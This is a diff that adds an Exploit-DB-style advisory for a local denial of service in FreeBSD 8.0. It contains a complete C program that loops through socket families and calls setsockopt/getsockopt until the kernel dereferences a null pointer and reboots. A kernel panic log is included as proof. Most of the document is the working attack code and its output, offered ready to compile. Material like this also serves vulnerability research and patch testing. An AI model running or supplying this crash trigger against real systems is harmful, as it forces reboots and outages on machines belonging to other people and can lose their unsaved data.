@@ -1,0 +1,65 @@
+# Exploit Title: FreeBSD local denial of service - forced reboot
+# Date: 28. January 2011
+# Author: Kingcope
+# Software Link: http://www.freebsd.org
+# Operating System: FreeBSD
+# Tested on: 8.0-RELEASE
+
+This source code when compiled and executed
+will reboot at least FreeBSD 8.0-RELEASE because of a null pointer dereference.
+
+#include <sys/types.h>
+#include <sys/mman.h>
+#define PAGE_SIZE 4096
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <sys/socket.h>
+main() {
+       int k,fd,i2,i3,i4,i5,i6,i7,i8;
+char *p;
+      char buf[4096];
+
+      for (i2=0;i2<256;i2++) {
+       for (i3=0;i3<2;i3++) {
+       for (i4=0;i4<2;i4++) {
+       fd = socket(i2, i3, i4);
+       if (fd < 0) continue;
+       printf("SUCCESS!\n");
+       for (i5=0;i5<100;i5++) {
+       for (i6=0;i6<100;i6++) {
+       setsockopt(fd, i5, i6, buf, 4);
+       getsockopt(fd, i5, i6, buf, &i7);
+       }}}}}
+}
+
+The crash dump looks like the following.
+
+Jan 28 11:33:07 r00tme kernel:
+Jan 28 11:33:07 r00tme kernel:
+Jan 28 11:33:07 r00tme kernel: Fatal trap 12: page fault while in kernel mode
+Jan 28 11:33:07 r00tme kernel: cpuid = 0; apic id = 00
+Jan 28 11:33:07 r00tme kernel: fault virtual address    = 0xc
+Jan 28 11:33:07 r00tme kernel: fault code               = supervisor
+write, page not present
+Jan 28 11:33:07 r00tme kernel: instruction pointer      = 0x20:0xc06143ba
+Jan 28 11:33:07 r00tme kernel: stack pointer            = 0x28:0xcd1fa5b4
+Jan 28 11:33:07 r00tme kernel: frame pointer            = 0x28:0xcd1fa85c
+Jan 28 11:33:07 r00tme kernel: code segment             = base 0x0,
+limit 0xfffff, type 0x1b
+Jan 28 11:33:07 r00tme kernel: = DPL 0, pres 1, def32 1, gran 1
+Jan 28 11:33:07 r00tme kernel: processor eflags = interrupt enabled,
+resume, IOPL = 0
+Jan 28 11:33:07 r00tme kernel: current process          = 1004 (bsdcrash)
+Jan 28 11:33:07 r00tme kernel: trap number              = 12
+Jan 28 11:33:07 r00tme kernel: panic: page fault
+Jan 28 11:33:07 r00tme kernel: cpuid = 0
+Jan 28 11:33:07 r00tme kernel: Uptime: 2m48s
+Jan 28 11:33:07 r00tme kernel: Cannot dump. Device not defined or unavailable.
+Jan 28 11:33:07 r00tme kernel: Automatic reboot in 15 seconds - press
+a key on the console to abort
+Jan 28 11:33:07 r00tme kernel: Rebooting...
+
+The cause of the crash seems to be a specific network driver. Since
+the crash is forced (only?) in a VMWare virtual machine the
+exploitability can be dependent on the loaded device drivers
+and installed hardware.
